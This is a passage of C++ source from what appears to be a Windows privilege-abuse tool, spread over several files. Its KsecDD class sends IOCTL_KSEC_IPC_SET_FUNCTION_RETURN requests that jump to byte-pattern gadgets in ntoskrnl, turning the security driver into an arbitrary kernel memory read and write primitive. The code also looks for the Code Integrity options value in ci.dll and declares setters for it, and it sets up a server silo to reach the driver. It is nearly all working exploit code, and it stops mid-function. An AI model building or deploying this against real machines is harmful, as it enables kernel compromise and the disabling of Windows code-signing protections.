    bResult = TRUE;

exit:
    if (!bResult && hDevice) NtClose(hDevice);

    return bResult;
}

BOOL KsecDD::DeviceIoControl(IN HANDLE Device, IN DWORD IoControlCode, IN OPTIONAL LPVOID InBuffer, IN DWORD InBufferSize, OUT OPTIONAL LPVOID OutBuffer, IN DWORD OutBufferSize)
{
    NTSTATUS status;
    IO_STATUS_BLOCK iosb = { 0 };

    status = NtDeviceIoControlFile(Device, NULL, NULL, NULL, &iosb, IoControlCode, InBuffer, InBufferSize, OutBuffer, OutBufferSize);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtDeviceIoControlFile", status);
        return FALSE;
    }

    return TRUE;
}

BOOL KsecDD::IoctlConnectLsa(OUT OPTIONAL PDWORD SystemPid)
{
    DWORD dwLsapSystemProcessId = 0;

    if (!this->DeviceIoControl(this->m_hDevice, IOCTL_KSEC_CONNECT_LSA, NULL, 0, &dwLsapSystemProcessId, sizeof(dwLsapSystemProcessId)))
    {
        return FALSE;
    }

    if (SystemPid) *SystemPid = dwLsapSystemProcessId;

    return TRUE;
}

BOOL KsecDD::IoctlIpcSetFunctionReturn(IN PSET_FUNCTION_RETURN_REQ Request)
{
    if (!this->DeviceIoControl(this->m_hDevice, IOCTL_KSEC_IPC_SET_FUNCTION_RETURN, Request, sizeof(*Request), NULL, 0))
        return FALSE;

    return TRUE;
}

BOOL KsecDD::ReadKernelMemory32(IN ULONG_PTR Address, OUT PUINT32 Value)
{
    UINT64 val = 0;

    if (!this->ReadKernelMemory64(Address, &val))
        return FALSE;

    *Value = val & 0xffffffff;

    return TRUE;
}

BOOL KsecDD::ReadKernelMemory64(IN ULONG_PTR Address, OUT PUINT64 Value)
{
    FUNCTION_RETURN fr = { 0 };
    SET_FUNCTION_RETURN_REQ req = { 0 };

    if (!this->CheckIsInitialized())
        return FALSE;

    fr.Function = (PVOID)this->m_pReadGadgetAddress;
    fr.Argument = (PVOID)(Address - 0x10); // Account for 'RCX+0x10' in the gadget
    req.FunctionReturn = &fr;
    req.Value = 0; // EDX value not used here

    if (!this->IoctlIpcSetFunctionReturn(&req))
        return FALSE;

    *Value = (UINT64)req.FunctionReturn;

    return TRUE;
}

BOOL KsecDD::WriteKernelMemory32(IN ULONG_PTR Address, IN UINT32 Value)
{
    FUNCTION_RETURN fr = { 0 };
    SET_FUNCTION_RETURN_REQ req = { 0 };

    if (!this->CheckIsInitialized())
        return FALSE;

    fr.Function = (PVOID)this->m_pWriteGadgetAddress;
    fr.Argument = (PVOID)Address;
    req.FunctionReturn = &fr;
    req.Value = Value;

    if (!this->IoctlIpcSetFunctionReturn(&req))
        return FALSE;

    return TRUE;
}
```

`Common/KsecDD.h`:

```h
#pragma once

#include <Windows.h>

// ntddksec.h
#define DD_KSEC_DEVICE_NAME_U L"\\Device\\KsecDD"
#define IOCTL_KSEC_CONNECT_LSA                      CTL_CODE(FILE_DEVICE_KSEC,  0, METHOD_BUFFERED,     FILE_WRITE_ACCESS ) // 0x398000 (KsecDispatch)
#define IOCTL_KSEC_RNG                              CTL_CODE(FILE_DEVICE_KSEC,  1, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_RNG_REKEY                        CTL_CODE(FILE_DEVICE_KSEC,  2, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_ENCRYPT_MEMORY                   CTL_CODE(FILE_DEVICE_KSEC,  3, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS )
#define IOCTL_KSEC_DECRYPT_MEMORY                   CTL_CODE(FILE_DEVICE_KSEC,  4, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS )
#define IOCTL_KSEC_ENCRYPT_MEMORY_CROSS_PROC        CTL_CODE(FILE_DEVICE_KSEC,  5, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS )
#define IOCTL_KSEC_DECRYPT_MEMORY_CROSS_PROC        CTL_CODE(FILE_DEVICE_KSEC,  6, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS )
#define IOCTL_KSEC_ENCRYPT_MEMORY_SAME_LOGON        CTL_CODE(FILE_DEVICE_KSEC,  7, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS )
#define IOCTL_KSEC_DECRYPT_MEMORY_SAME_LOGON        CTL_CODE(FILE_DEVICE_KSEC,  8, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS )
#define IOCTL_KSEC_FIPS_GET_FUNCTION_TABLE          CTL_CODE(FILE_DEVICE_KSEC,  9, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_ALLOC_POOL                       CTL_CODE(FILE_DEVICE_KSEC, 10, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390028 KsecIoctlAllocPool
#define IOCTL_KSEC_FREE_POOL                        CTL_CODE(FILE_DEVICE_KSEC, 11, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x39002c KsecIoctlFreePool
#define IOCTL_KSEC_COPY_POOL                        CTL_CODE(FILE_DEVICE_KSEC, 12, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390030 KsecIoctlCopyPool
#define IOCTL_KSEC_DUPLICATE_HANDLE                 CTL_CODE(FILE_DEVICE_KSEC, 13, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390034 KsecIoctlDupLsaHandle
#define IOCTL_KSEC_REGISTER_EXTENSION               CTL_CODE(FILE_DEVICE_KSEC, 14, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390038 KsecRegisterExtension
#define IOCTL_KSEC_CLIENT_CALLBACK                  CTL_CODE(FILE_DEVICE_KSEC, 15, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x39003c KsecIoctlClientCallback
#define IOCTL_KSEC_GET_BCRYPT_EXTENSION	            CTL_CODE(FILE_DEVICE_KSEC, 16, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_GET_SSL_EXTENSION                CTL_CODE(FILE_DEVICE_KSEC, 17, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_GET_DEVICECONTROL_EXTENSION	    CTL_CODE(FILE_DEVICE_KSEC, 18, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_ALLOC_VM                         CTL_CODE(FILE_DEVICE_KSEC, 19, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x39004c KsecIoctlAllocVm
#define IOCTL_KSEC_FREE_VM                          CTL_CODE(FILE_DEVICE_KSEC, 20, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390050 KsecIoctlFreeVm
#define IOCTL_KSEC_COPY_VM                          CTL_CODE(FILE_DEVICE_KSEC, 21, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390054 KsecIoctlCopyVm
#define IOCTL_KSEC_CLIENT_FREE_VM                   CTL_CODE(FILE_DEVICE_KSEC, 22, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_INSERT_PROTECTED_PROCESS_ADDRESS CTL_CODE(FILE_DEVICE_KSEC, 23, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x39005c KsecIoctlInsertProtectedProcessAddress
#define IOCTL_KSEC_REMOVE_PROTECTED_PROCESS_ADDRESS CTL_CODE(FILE_DEVICE_KSEC, 24, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390060 KsecIoctlRemoveProtectedProcessAddress
#define IOCTL_KSEC_GET_BCRYPT_EXTENSION2            CTL_CODE(FILE_DEVICE_KSEC, 25, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_IPC_GET_QUEUED_FUNCTION_CALLS    CTL_CODE(FILE_DEVICE_KSEC, 26, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS ) // 0x39006a (KsecDispatch)
#define IOCTL_KSEC_IPC_SET_FUNCTION_RETURN          CTL_CODE(FILE_DEVICE_KSEC, 27, METHOD_NEITHER,      FILE_ANY_ACCESS ) // 0x39006f KsecIoctlHandleFunctionReturn
#define IOCTL_KSEC_AUDIT_SELFTEST_SUCCESS           CTL_CODE(FILE_DEVICE_KSEC, 28, METHOD_NEITHER,      FILE_ANY_ACCESS )
#define IOCTL_KSEC_AUDIT_SELFTEST_FAILURE           CTL_CODE(FILE_DEVICE_KSEC, 29, METHOD_BUFFERED,     FILE_ANY_ACCESS )

#define KSEC_EVENT_NAME_U L"\\SECURITY\\LSA_AUTHENTICATION_INITIALIZED"

// Gadget in 'ntoskrnl!ViThunkReplacePristine'
// 488B4110498900B801000000C3
#define PATTERN_READ_MEMORY { \
    0x48, 0x8B, 0x41, 0x10,         /* MOV   RAX, qword ptr [RCX + 0x10] */ \
    0x49, 0x89, 0x00,               /* MOV   qword ptr [R8], RAX         */ \
    0xB8, 0x01, 0x00, 0x00, 0x00,   /* MOV   EAX, 0x1                    */ \
    0xC3                            /* RET                               */ \
}

// 8911C3
#define PATTERN_WRITE_MEMORY { \
    0x89, 0x11,                     /* MOV   dword ptr [RCX], EDX        */ \
    0xC3                            /* RET                               */ \
}

typedef struct _FUNCTION_RETURN
{
    PVOID Function; // Control RAX in CALL
    PVOID Argument; // Control RCX in CALL
} FUNCTION_RETURN, * PFUNCTION_RETURN;

typedef struct _SET_FUNCTION_RETURN_REQ
{
    PFUNCTION_RETURN FunctionReturn;
    DWORD Value; // Control EDX in CALL
} SET_FUNCTION_RETURN_REQ, * PSET_FUNCTION_RETURN_REQ;

class KsecDD
{
public:
    KsecDD();
    ~KsecDD();

    BOOL IsInitialized() const;
    BOOL IsConnected();
    BOOL Connect();
    BOOL Disconnect();
    BOOL QueryCiOptionsValue(OUT PDWORD CiOptions);
    BOOL SetCiOptionsValue(IN DWORD CiOptions);

private:
    HANDLE m_hDevice;
    BOOL m_bIsInitialized;
    ULONG_PTR m_pKernelBaseAddress;
    ULONG_PTR m_pCiBaseAddress;
    DWORD m_dwCiOptionsOffset;
    DWORD m_dwReadGadgetOffset;
    DWORD m_dwWriteGadgetOffset;
    ULONG_PTR m_pReadGadgetAddress;
    ULONG_PTR m_pWriteGadgetAddress;

    BOOL CheckIsInitialized();
    BOOL SetLsaInitializedEvent(IN LPCWSTR Event);
    BOOL OpenDevice(IN LPCWSTR Name, OUT PHANDLE Device);
    BOOL DeviceIoControl(IN HANDLE Device, IN DWORD IoControlCode, IN OPTIONAL LPVOID InBuffer, IN DWORD InBufferSize, OUT OPTIONAL LPVOID OutBuffer, IN DWORD OutBufferSize);
    
    BOOL IoctlConnectLsa(OUT OPTIONAL PDWORD SystemPid);
    BOOL IoctlIpcSetFunctionReturn(IN PSET_FUNCTION_RETURN_REQ Request);

    BOOL ReadKernelMemory32(IN ULONG_PTR Address, OUT PUINT32 Value);
    BOOL ReadKernelMemory64(IN ULONG_PTR Address, OUT PUINT64 Value);
    BOOL WriteKernelMemory32(IN ULONG_PTR Address, IN UINT32 Value);
};
```

`Common/ServerSilo.cpp`:

```cpp
#include "ServerSilo.h"
#include "common.h"
#include "nt.h"
#include <strsafe.h>

ServerSilo::ServerSilo()
{
    m_hServerSilo = NULL;
    m_hDeleteEvent = NULL;
    m_pwszRootDirectory = NULL;
    m_bIsInitialized = FALSE;

    if (!(m_hDeleteEvent = ::CreateEventW(NULL, TRUE, FALSE, NULL))) goto exit;

    if (!this->CreateSilo(&m_hServerSilo)) goto exit;
    if (!this->SetSystemRoot(m_hServerSilo, NULL)) goto exit;
    if (!this->QueryRootDirectory(m_hServerSilo, &m_pwszRootDirectory)) goto exit;
    if (!this->CreateDeviceDirectory(m_pwszRootDirectory)) goto exit;
    if (!this->Initialize(m_hServerSilo, m_hDeleteEvent)) goto exit;

    m_bIsInitialized = TRUE;

exit:
    return;
}

ServerSilo::~ServerSilo()
{
    if (m_hServerSilo)
    {
        this->Terminate(m_hServerSilo, STATUS_SUCCESS);
        this->Close(m_hServerSilo);
    }

    if (m_hDeleteEvent) CloseHandle(m_hDeleteEvent);
    if (m_pwszRootDirectory) Common::Free(m_pwszRootDirectory);
}

HANDLE ServerSilo::GetHandle() const
{
    return m_hServerSilo;
}

LPWSTR ServerSilo::GetRootDirectory() const
{
    return m_pwszRootDirectory;
}

BOOL ServerSilo::IsInitialized() const
{
    return m_bIsInitialized;
}

BOOL ServerSilo::CreateJob(OUT PHANDLE Job, IN ACCESS_MASK Access)
{
    NTSTATUS status;
    HANDLE hJob = NULL;

    *Job = NULL;

    status = NtCreateJobObject(&hJob, Access, NULL);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtCreateJobObject", status);
        return FALSE;
    }

    *Job = hJob;

    return TRUE;
}

BOOL ServerSilo::SetLimitFlags(IN HANDLE Job, IN DWORD Flags)
{
    BOOL bResult = FALSE;
    NTSTATUS status;
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION_V2 info = { 0 };

    info.BasicLimitInformation.LimitFlags = Flags;

    status = NtSetInformationJobObject(Job, JobObjectExtendedLimitInformation, &info, sizeof(info));
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtSetInformationJobObject", status);
        return FALSE;
    }

    return TRUE;
}

BOOL ServerSilo::ConvertJobToSilo(IN HANDLE Job)
{
    NTSTATUS status;

    status = NtSetInformationJobObject(Job, JobObjectCreateSilo, NULL, 0);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtSetInformationJobObject", status);
        return FALSE;
    }

    return TRUE;
}

BOOL ServerSilo::AssignProcess(IN HANDLE Job, IN HANDLE Process)
{
    NTSTATUS status;

    status = NtAssignProcessToJobObject(Job, Process);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtAssignProcessToJobObject", status);
        return FALSE;
    }

    return TRUE;
}

BOOL ServerSilo::SetRootDirectory(IN HANDLE Job, IN DWORD RootDirectoryFlags)
{
    BOOL bResult = FALSE;
    NTSTATUS status;
    SILOOBJECT_ROOT_DIRECTORY sro = { 0 };

    sro.ControlFlags = RootDirectoryFlags;

    status = NtSetInformationJobObject(Job, (JOBOBJECTINFOCLASS)JobObjectSiloRootDirectory, &sro, sizeof(sro));
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtSetInformationJobObject", status);
        return FALSE;
    }

    return TRUE;
}

BOOL ServerSilo::CreateSilo(OUT PHANDLE Silo)
{
    BOOL bResult = FALSE;
    HANDLE hJob = NULL;

    *Silo = NULL;

    if (!this->CreateJob(&hJob, JOB_OBJECT_ALL_ACCESS)) goto exit;
    if (!this->SetLimitFlags(hJob, JOB_OBJECT_LIMIT_SILO_READY)) goto exit;
    if (!this->ConvertJobToSilo(hJob)) goto exit;
    if (!this->AssignProcess(hJob, (HANDLE)-7)) goto exit;
    if (!this->SetRootDirectory(hJob, SILO_OBJECT_ROOT_DIRECTORY_ALL)) goto exit;

    *Silo = hJob;
    bResult = TRUE;

exit:
    return bResult;
}

BOOL ServerSilo::SetSystemRoot(IN HANDLE Job, IN OPTIONAL LPCWSTR SystemRoot)
{
    BOOL bResult = FALSE;
    NTSTATUS status;
    WCHAR wszWindowsDirectory[MAX_PATH];
    DWORD dwWindowsDirectoryLength;
    LPWSTR pwszSystemRoot = NULL;
    PUNICODE_STRING pusSystemRoot = NULL;

    if (!SystemRoot)
    {
        if (!GetWindowsDirectoryW(wszWindowsDirectory, MAX_PATH))
        {
            PRINT_ERROR_WIN32(L"GetSystemDirectoryW");
            goto exit;
        }

        // Remove trailing slash in system directory path
        dwWindowsDirectoryLength = (DWORD)wcslen(wszWindowsDirectory);
        if (dwWindowsDirectoryLength && wszWindowsDirectory[dwWindowsDirectoryLength - 1] == '\\')
            wszWindowsDirectory[dwWindowsDirectoryLength - 1] = '\0';
    }

    if (!(pusSystemRoot = (PUNICODE_STRING)Common::Alloc(sizeof(*pusSystemRoot)))) goto exit;

    if (!RtlCreateUnicodeString(pusSystemRoot, SystemRoot ? SystemRoot : wszWindowsDirectory))
    {
        PRINT_ERROR(L"RtlCreateUnicodeString failed.\n");
        goto exit;
    }

    status = NtSetInformationJobObject(Job, (JOBOBJECTINFOCLASS)JobObjectSiloSystemRoot, pusSystemRoot, sizeof(*pusSystemRoot));
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtSetInformationJobObject", status);
        goto exit;
    }

    bResult = TRUE;

exit:
    if (pusSystemRoot)
    {
        if (pusSystemRoot->Buffer)
            RtlFreeUnicodeString(pusSystemRoot);
        Common::Free(pusSystemRoot);
    }

    return bResult;
}

BOOL ServerSilo::QueryRootDirectory(IN HANDLE Job, OUT LPWSTR* RootDirectory)
{
    BOOL bResult = FALSE;
    NTSTATUS status;
    ULONG len = 0;
    PSILOOBJECT_ROOT_DIRECTORY psrd = NULL;
    const DWORD dwBufferSize = 0x1000;
    LPWSTR pwszRootDirectory = NULL;
    DWORD dwRootDirectoryLength;

    *RootDirectory = NULL;

    if (!(psrd = (PSILOOBJECT_ROOT_DIRECTORY)Common::Alloc(dwBufferSize))) goto exit;

    status = NtQueryInformationJobObject(Job, (JOBOBJECTINFOCLASS)JobObjectSiloRootDirectory, psrd, dwBufferSize, &len);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtQueryInformationJobObject", status);
        goto exit;
    }

    dwRootDirectoryLength = (DWORD)wcslen(psrd->Path.Buffer);

    if (!(pwszRootDirectory = (LPWSTR)Common::Alloc((dwRootDirectoryLength + 1) * sizeof(*pwszRootDirectory)))) goto exit;
    StringCchPrintfW(pwszRootDirectory, dwRootDirectoryLength + 1, L"%ws", psrd->Path.Buffer);
    *RootDirectory = pwszRootDirectory;
    bResult = TRUE;

exit:
    if (!bResult && pwszRootDirectory) Common::Free(pwszRootDirectory);
    if (psrd) Common::Free(psrd);

    return bResult;
}

BOOL ServerSilo::CreateDeviceDirectory(IN LPWSTR RootDirectory)
{
    BOOL bResult = FALSE;
    NTSTATUS status;
    UNICODE_STRING usDevicePath = { 0 }, usSiloDevicePath = { 0 };
    OBJECT_ATTRIBUTES oa = { 0 };
    HANDLE hDeviceDirectory = NULL, hSiloDeviceDirectory = NULL;
    WCHAR wszSiloDevicePath[MAX_PATH] = { 0 };

    RtlInitUnicodeString(&usDevicePath, L"\\Device");
    InitializeObjectAttributes(&oa, &usDevicePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenDirectoryObject(&hDeviceDirectory, MAXIMUM_ALLOWED, &oa);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtOpenDirectoryObject", status);
        goto exit;
    }

    StringCchPrintfW(wszSiloDevicePath, MAX_PATH, L"%ws\\Device", RootDirectory);

    RtlInitUnicodeString(&usSiloDevicePath, wszSiloDevicePath);
    InitializeObjectAttributes(&oa, &usSiloDevicePath, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT | OBJ_OPENIF, NULL, NULL);

    status = NtCreateDirectoryObjectEx(&hSiloDeviceDirectory, MAXIMUM_ALLOWED, &oa, hDeviceDirectory, 0);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtCreateDirectoryObjectEx", status);
        goto exit;
    }

    bResult = TRUE;

exit:
    if (hSiloDeviceDirectory) NtClose(hSiloDeviceDirectory);
    if (hDeviceDirectory) NtClose(hDeviceDirectory);

    return bResult;
}

BOOL ServerSilo::Initialize(IN HANDLE Job, IN HANDLE DeleteEvent)
{
    NTSTATUS status;
    SERVERSILO_INIT_INFORMATION init = { 0 };
    
    init.DeleteEvent = DeleteEvent;
    init.IsDownlevelContainer = FALSE;

    status = NtSetInformationJobObject(Job, (JOBOBJECTINFOCLASS)JobObjectServerSiloInitialize, &init, sizeof(init));
    if (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        status = NtSetInformationJobObject(Job, (JOBOBJECTINFOCLASS)JobObjectServerSiloInitialize, &DeleteEvent, sizeof(DeleteEvent));
    }

    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtSetInformationJobObject", status);
        return FALSE;
    }

    return TRUE;
}

BOOL ServerSilo::Terminate(IN HANDLE Job, IN NTSTATUS ExitStatus)
{
    NTSTATUS status;

    status = NtTerminateJobObject(Job, ExitStatus);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtTerminateJobObject", status);
        return FALSE;
    }

    return TRUE;
}

BOOL ServerSilo::Close(IN HANDLE Job)
{
    NTSTATUS status;

    status = NtClose(Job);

    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtClose", status);
        return FALSE;
    }

    return TRUE;
}
```

`Common/ServerSilo.h`:

```h
#pragma once

#include <Windows.h>

class ServerSilo
{
public:
    ServerSilo();
    ~ServerSilo();

    HANDLE GetHandle() const;
    LPWSTR GetRootDirectory() const;
    BOOL IsInitialized() const;

private:
    HANDLE m_hServerSilo;
    HANDLE m_hDeleteEvent;
    LPWSTR m_pwszRootDirectory;
    BOOL m_bIsInitialized;

    BOOL CreateJob(OUT PHANDLE Job, IN ACCESS_MASK Access);
    BOOL SetLimitFlags(IN HANDLE Job, IN DWORD Flags);
    BOOL ConvertJobToSilo(IN HANDLE Job);
    BOOL AssignProcess(IN HANDLE Job, IN HANDLE Process);
    BOOL SetRootDirectory(IN HANDLE Job, IN DWORD RootDirectoryFlags);
    BOOL CreateSilo(OUT PHANDLE Silo);
    BOOL SetSystemRoot(IN HANDLE Job, IN OPTIONAL LPCWSTR SystemRoot);
    BOOL QueryRootDirectory(IN HANDLE Job, OUT LPWSTR* RootDirectory);
    BOOL CreateDeviceDirectory(IN LPWSTR RootDirectory);
    BOOL Initialize(IN HANDLE Job, IN HANDLE DeleteEvent);
    BOOL Terminate(IN HANDLE Job, IN NTSTATUS ExitStatus);
    BOOL Close(IN HANDLE Job);
};
```

`Common/common.cpp`:

```cpp
#include "common.h"
#include "nt.h"
#include <iostream>
#include <strsafe.h>
#include <tlhelp32.h>

VOID Common::PrintSystemError(_In_ DWORD ErrorCode)
{
    LPWSTR pwszErrorMessage = NULL;

    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        ErrorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPWSTR)&pwszErrorMessage,
        0,
        NULL
    );

    if (pwszErrorMessage)
    {
        wprintf(L"%ws", pwszErrorMessage);
        LocalFree(pwszErrorMessage); // FORMAT_MESSAGE_ALLOCATE_BUFFER
    }
    else
    {
        PRINT_ERROR_WIN32(L"FormatMessageW");
    }
}

LPVOID Common::Alloc(_In_ SIZE_T Size)
{
    LPVOID lpMem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);

    if (!lpMem)
    {
        PRINT_ERROR_WIN32(L"HeapAlloc");
        return NULL;
    }

    return lpMem;
}

BOOL Common::Free(_In_ LPVOID Mem)
{
    if (!HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Mem))
    {
        PRINT_ERROR_WIN32(L"HeapFree");
        return FALSE;
    }

    return TRUE;
}

BOOL Common::FindKernelModuleBaseAddress(_In_ LPCSTR ModuleName, _Inout_ PULONG_PTR ModuleAddress)
{
    BOOL bResult = FALSE;
    NTSTATUS status;
    ULONG size = 0;
    PRTL_PROCESS_MODULES pModules = NULL;

    status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &size);
    if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
        PRINT_ERROR_NT(L"NtQuerySystemInformation", status);
        goto exit;
    }

    if (!(pModules = (PRTL_PROCESS_MODULES)Common::Alloc(size))) goto exit;

    status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, pModules, size, &size);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtQuerySystemInformation", status);
        goto exit;
    }

    for (ULONG i = 0; i < pModules->NumberOfModules; i++)
    {
        RTL_PROCESS_MODULE_INFORMATION Module = pModules->Modules[i];

        if (_stricmp(ModuleName, (PCHAR)Module.FullPathName + Module.OffsetToFileName) == 0)
        {
            *ModuleAddress = (ULONG_PTR)Module.ImageBase;
            bResult = TRUE;
            break;
        }
    }

    if (!bResult)
        PRINT_ERROR_A("Could not determine base address of kernel module '%s'.\n", ModuleName);

exit:
    if (pModules) Common::Free(pModules);

    return bResult;
}

BOOL Common::EnumModuleSections(_In_ HMODULE Module, _Inout_ std::vector<ImageSectionHeaderInfo> &SectionList)
{
    BOOL bResult = FALSE;
    const DWORD dwBufferSize = 0x1000;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    PIMAGE_SECTION_HEADER pSectionHeader;
    PBYTE pBuffer = NULL;

    SectionList.clear();

    if (!(pBuffer = (PBYTE)Common::Alloc(dwBufferSize))) goto exit;
    if (!(pNtHeaders = RtlImageNtHeader(Module))) goto exit;

    for (DWORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)pNtHeaders + sizeof(*pNtHeaders) + i * sizeof(*pSectionHeader));

        ImageSectionHeaderInfo ish = ImageSectionHeaderInfo();

        ZeroMemory(ish.Name, sizeof(ish.Name));
        memcpy(ish.Name, pSectionHeader->Name, sizeof(pSectionHeader->Name));
        ish.VirtualAddress = pSectionHeader->VirtualAddress;
        ish.VirtualSize = pSectionHeader->Misc.VirtualSize;
        ish.Characteristics = pSectionHeader->Characteristics;

        SectionList.push_back(ish);
    }

    bResult = SectionList.size() == pNtHeaders->FileHeader.NumberOfSections;

exit:
    if (pBuffer) Common::Free(pBuffer);

    return bResult;
}

BOOL Common::FindModuleSection(_In_ HMODULE Module, _In_ LPCSTR SectionName, _Inout_ ImageSectionHeaderInfo& Section)
{
    BOOL bResult = FALSE;
    std::vector<ImageSectionHeaderInfo> sections;

    if (!Common::EnumModuleSections(Module, sections)) goto exit;

    for (auto& section : sections)
    {
        if (_stricmp(SectionName, section.Name) == 0)
        {
            Section = section;
            bResult = TRUE;
            break;
        }
    }

exit:
    if (!bResult) PRINT_ERROR_A("Could not find section '%s' in module @ 0x%llx\n", SectionName, (ULONG_PTR)Module);

    return bResult;
}

BOOL Common::IsWritableAddress(_In_ HMODULE Module, _In_ ULONG_PTR Address)
{
    BOOL bResult = FALSE;
    std::vector<ImageSectionHeaderInfo> sections;
    ULONG_PTR pSectionStart, pSectionEnd;

    if (!Common::EnumModuleSections(Module, sections)) goto exit;

    for (auto& section : sections)
    {
        pSectionStart = (ULONG_PTR)Module + section.VirtualAddress;
        pSectionEnd = pSectionStart + section.VirtualSize;

        if (Address >= pSectionStart && Address < pSectionEnd)
        {
            if (section.Characteristics & IMAGE_SCN_MEM_WRITE)
            {
                bResult = TRUE;
                break;
            }
        }
    }

exit:

    return bResult;
}

BOOL Common::FindPatternOffset(_In_ LPVOID Buffer, _In_ DWORD BufferSize, _In_ PBYTE Pattern, _In_ DWORD PatternSize, _Out_ PDWORD PatternOffset)
{
    BOOL bResult = FALSE;
    PVOID pCurrentAddress = NULL;

    *PatternOffset = 0;

    __try
    {
        for (DWORD i = 0; i < BufferSize - PatternSize; i++)
        {
            pCurrentAddress = (PVOID)((ULONG_PTR)Buffer + i);
            if (memcmp((PBYTE)pCurrentAddress, Pattern, PatternSize) == 0)
            {
                *PatternOffset = i;
                bResult = TRUE;
                break;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        PRINT_WARNING(L"Exception while accessing memory @ 0x%llx (err=0x%08x)\n", (ULONG_PTR)pCurrentAddress, GetExceptionCode());
    }

    return bResult;
}

BOOL Common::FindGadgetOffset(_In_ LPCWSTR Module, _In_ PBYTE Gadget, _In_ DWORD GadgetSize, _Out_ PDWORD GadgetOffset)
{
    BOOL bResult = FALSE;
    HMODULE hModule = NULL;
    ULONG_PTR pSectionAddress;
    std::vector<Common::ImageSectionHeaderInfo> sections;
    DWORD dwPatternOffset;

    *GadgetOffset = 0;

    // Dirty hack
    if (!(hModule = LoadLibraryExW(Module, NULL, DONT_RESOLVE_DLL_REFERENCES)))
    {
        PRINT_ERROR_WIN32(L"LoadLibraryExW");
        goto exit;
    }

    //PRINT_VERBOSE(L"Module loaded @ 0x%llx\n", (ULONG_PTR)hModule);

    if (!Common::EnumModuleSections(hModule, sections)) goto exit;

    for (auto& section : sections)
    {
        if (section.Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE))
        {
            pSectionAddress = (ULONG_PTR)hModule + section.VirtualAddress;
            //PRINT_VERBOSE_A("Searching %s @ 0x%llx (size=%d)\n", section.Name, pSectionAddress, section.VirtualSize);
            if (Common::FindPatternOffset((LPVOID)pSectionAddress, section.VirtualSize, Gadget, GadgetSize, &dwPatternOffset))
            {
                *GadgetOffset = section.VirtualAddress + dwPatternOffset;
                //PRINT_VERBOSE(L"Pattern offset: 0x%08x\n", *GadgetOffset);
                bResult = TRUE;
                break;
            }
        }
    }

exit:
    if (hModule) FreeLibrary(hModule);
    if (!bResult) PRINT_ERROR(L"Cound not find gadget of size %d in module '%ws'.\n", GadgetSize, Module);

    return bResult;
}

BOOL Common::FindCiOptionsOffset(_Out_ PDWORD Offset)
{
    BOOL bResult = FALSE;
    HMODULE hModule = NULL;
    auto section = Common::ImageSectionHeaderInfo();
    PVOID pCiInitialize = NULL;

    *Offset = 0;

    // Dirty hack
    if (!(hModule = LoadLibraryExW(L"ci.dll", NULL, DONT_RESOLVE_DLL_REFERENCES)))
    {
        PRINT_ERROR_WIN32(L"LoadLibraryExW");
        goto exit;
    }

    //PRINT_VERBOSE("ci.dll @ 0x%llx\n", (ULONG_PTR)hModule);

